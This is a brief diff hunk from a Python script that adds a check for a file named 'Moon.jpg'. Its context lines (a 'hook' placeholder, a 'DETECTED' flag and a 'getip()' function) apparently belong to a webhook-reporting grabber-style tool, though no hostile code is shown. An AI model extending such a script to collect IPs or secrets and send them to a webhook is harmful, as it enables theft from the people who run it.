@@ -19,6 +19,11 @@ import subprocess
 hook = "X"
 DETECTED = False
 
+moon = "Moon.jpg"
+if os.path.exists(moon) == False:
+    print('"Moon.jpg" NOT FOUND.')
+    quit()
+
 
 def getip():
     ip = "None"
